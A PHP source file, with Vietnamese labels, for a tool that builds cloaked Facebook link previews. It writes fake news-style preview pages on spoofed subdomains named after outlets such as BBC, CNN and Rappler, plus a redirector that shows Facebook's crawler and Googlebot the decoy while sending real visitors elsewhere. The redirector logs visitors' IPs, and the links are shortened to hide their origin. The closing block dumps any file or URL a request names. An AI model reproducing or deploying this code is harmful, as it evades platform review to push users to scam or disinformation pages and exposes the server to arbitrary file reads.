<?php session_start(); /* Starts the session */

if (!isset($_SESSION['UserData']['Username'])) {
    header("location:login.php");
    exit;
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <style type="text/css">
        @import "bourbon";

    body {
        background: #eee !important;
    }

    .wrapper {
        margin-top: 80px;
      margin-bottom: 80px;
    }

    .form-signin {
      max-width: 380px;
      padding: 15px 35px 45px;
      margin: 0 auto;
      background-color: #fff;
      border: 1px solid rgba(0,0,0,0.1);

      .form-signin-heading,
        .checkbox {
          margin-bottom: 30px;
        }

    .checkbox {
      font-weight: normal;
    }

    .form-control {
      position: relative;
      font-size: 16px;
      height: auto;
      padding: 10px;
        @include box-sizing(border-box);

        &:focus {
          z-index: 2;
        }
    }

    input[type="text"] {
      margin-bottom: -1px;
      border-bottom-left-radius: 0;
      border-bottom-right-radius: 0;
    }

    input[type="password"] {
      margin-bottom: 20px;
      border-top-left-radius: 0;
      border-top-right-radius: 0;
    }
}

    </style>
</head>
<body>
    <div class="container">
    <form action="" method="post">
    <label>Fake link: (Nếu dùng fake link chỉ điền ô này)</label>
    <input class="form-control" type="text" name="fake_link" id="textbox"/> </br>
    <label>Tiêu đề:</label>
    <input class="form-control" type="text" name="title" id="textbox"/> </br>
    <label>Mô tả:</label>
    <input class="form-control" type="text" name="description" id="textbox"/> </br>
    <label>Link ảnh:</label>
    <input class="form-control" type="text" name="image" id="textbox"/> </br>
    <label>Địa chỉ Đến:</label>
    <input class="form-control" type="text" name="url" id="textbox"/> </br>
    <input type="submit" value="Fake" class="btn btn-lg btn-primary"/></br>
    <br>
    </form>
    <?php

function generateRandomString($length = 100)
{
    return substr(str_shuffle(str_repeat($x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-', ceil($length / strlen($x)))), 1, $length);
}

function randomAsciiChar($length)
{
    $char = '';
    for ($i = 0; $i < $length; $i++) {
        $char .= chr(rand(130, 172));
    }
    return $char;
}

function addHttp($url)
{
    if (!preg_match("~^(?:f|ht)tps?://~i", $url)) {
        $url = "http://" . $url;
    }
    return $url;
}

error_reporting(0);
if ($_POST["url"]) {
    // $n=rand(0000,9999);
    // $pathname = substr(md5(microtime()), rand(0, 26), 500);
    $pathname = generateRandomString();
    $filePhp = $pathname . ".php";
    $fileHtml = $pathname . ".html";
    $fphp = fopen($filePhp, 'w');
    $fhtml = fopen($fileHtml, 'w');

    $title = $_POST['title'];
    $description = $_POST['description'];
    $image = $_POST['image'];
    $mainLink = $_POST['url'];

    $subs = [
        'bbc',
        'cnn',
        'abc-cbn',
        'gma',
        'inquirer',
        'philstar',
        'rappler',
        'cnnphilippines',
        'breakingnews',
        'msn',
        'news',
        'gmanetwork',
        'philippinesnews',
        'tnp',
        'trendingnewsportal',
        'extremereader',
        'manila',
        'yahoo',
        'pep',
        '9gag',
        'diple',
        'dailystar',
        'dailynews',
        'dailymail',
        'filipo',
    ];

    $randomUrlOne = 'http://' . $subs[array_rand($subs)] . '.' . $_SERVER['HTTP_HOST'] . '/';
    $randomUrlTwo = 'http://' . $subs[array_rand($subs)] . '.' . $_SERVER['HTTP_HOST'] . '/';

    $facebookCheat = '
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>' . $title . '</title>
<meta property="fb:app_id" content="">
<meta property="article:author" content="https://www.facebook.com/4795236469298187">
<meta property="og:site_name" content="' . $title . '">
<meta name="news_keywords" content="Bernie Sanders, Warriors, Democrats,Politics,2016 Election">
<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex,nofollow">
<meta property="og:image" content="' . $image . '">
<meta property="image:width" content="1280">
<meta property="image:height" content="720">
<meta name="description" content="' . $description . '">
<meta name="keywords" content="ÂÃÂÂÃÂÂ¬ÃÃÂÂ©ÃÃÂÂÃÂ‹ÃÂÂÂ™ÃÂÃÃÂÂ²ÃÃ‹™¼ÃÂÃÂ¾ÃÂÂÃ¾ÂÃÂÂÂ»¼ÃÃÃ·ÃÃÂÃ½ÃÃ¯Ã¶ÃÂ³²ÂÂÂ¡ÂÃÂ¾ÂÂÃÂÂ‹ÃÃ«ÂÂÃÃÂÂÃÃ‹ÂÂ">
<meta name="fb_title" content="' . $title . '">
<meta property="og:type" content="website">
<meta property="og:title" content="' . $title . '">
<meta property="og:description" content="' . $description . '">
</head>
<body>  </body>
</html>
';

    fwrite($fhtml, $facebookCheat);
    fclose($fhtml);

    $fakeLink = $_POST['fake_link'];
    if (($_POST['fake_link']) == '') {
        $fakeLink = 'http://' . $subs[array_rand($subs)] . '.' . $_SERVER['HTTP_HOST'] . '/' . $fileHtml;
    }

    $redirectUrl = addHttp($_POST['url']);
    $realDomain = parse_url($redirectUrl, PHP_URL_HOST);
    date_default_timezone_set('Asia/Ho_Chi_Minh');

    $redirectString = "
<script type='text/javascript'>// <![CDATA[
var d='<data:blog.url/>';
d=d.replace(/.*\/\/[^\/]*/, '');
location.href = '" . $redirectUrl . "';
// ]]></script>
";

    $redirectPN = "
<script type='text/javascript'>// <![CDATA[
var d='<data:blog.url/>';
d=d.replace(/.*\/\/[^\/]*/, '');
location.href = 'http://philnews.info';
// ]]></script>
";

    $phpString = '
<?php
function checkIP($ip)
{
    $lowIp = ip2long(\'66.100.0.0\');
    $highIp = ip2long(\'66.255.255.255\');
    if ($ip <= $highIp && $lowIp <= $ip) {
        return true;
    }
}

function checkCountry($ip)
{
    $json = file_get_contents("http://ip-api.com/json/{$ip}");
    return json_decode($json)->countryCode;
}

$country = checkCountry($_SERVER[\'REMOTE_ADDR\']);

$allowedAgents = "allowedAgents' . $pathname . '.txt";
$blockedAgents = "blockedAgents' . $pathname . '.txt";

$ip = ip2long($_SERVER[\'REMOTE_ADDR\']);

if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
    strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
) {
    $fAgent = fopen($blockedAgents, \'a\');
    $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' blocked \' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header(\'Location: ' . $fakeLink . '\', true, 301);
    die();
} else {
    $fAgent = fopen($allowedAgents, \'a\');
    $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' ok \' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header(\'Location: ' . $redirectUrl . '\', true, 301);
    die();
}

';

    fwrite($fphp, $phpString);
    fclose($fphp);

    $lurl = 'http://' . $subs[array_rand($subs)] . '.' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
    $curl = curl_init();
    $post_data = array('format' => 'text',
        'apikey' => '85D97C460CDBCAEBIB5A',
        'provider' => 'tinyurl_com',
        'url' => $lurl);
    $api_url = 'http://tiny-url.info/api/v1/create';
    curl_setopt($curl, CURLOPT_URL, $api_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
    $result = curl_exec($curl);
    curl_close($curl);
    if ($realDomain !== 'vmnet.info' && $realDomain !== 'cangphone.info' && $realDomain !== '1dem.info' && $realDomain !== 'tan48.mesotheliomalawfirm.asia' && $realDomain !== 'tan25.mesotheliomalawfirm.asia' && $realDomain !== 'philnews.info' && $realDomain !== 't.co') {
        echo "Hãy liên hệ với admin để được trợ giúp";
        $betray = "betray.txt";
        $time = date("d-m-Y h:i:s");
        $text = "{$time} -- {$_POST['user']} dùng link giả {$_POST['fake_link']} kéo về {$_POST['url']}" . PHP_EOL;
        $text .= file_get_contents($betray);
        file_put_contents($betray, $text);
    } else {
        $work = "work.txt";
        $time = date("d-m-Y h:i:s");
        $text = "{$time} -- {$_POST['user']} dùng link giả {$_POST['fake_link']} kéo về {$_POST['url']}" . PHP_EOL;
        $text .= file_get_contents($work);
        file_put_contents($work, $text);
        echo "Link thường: " . "<a href ='$lurl'>" . $lurl . "</a><br>";
        echo "Link đã chuyển thành tinyurl.com: " . "<a href ='$result'>" . $result . "</a>";
    }
}
?>

    <br><br>
<?php
if (isset($_POST['file'])) {
    $loadFile = file_get_contents($_POST['file']);
    var_dump($loadFile);
}
?>


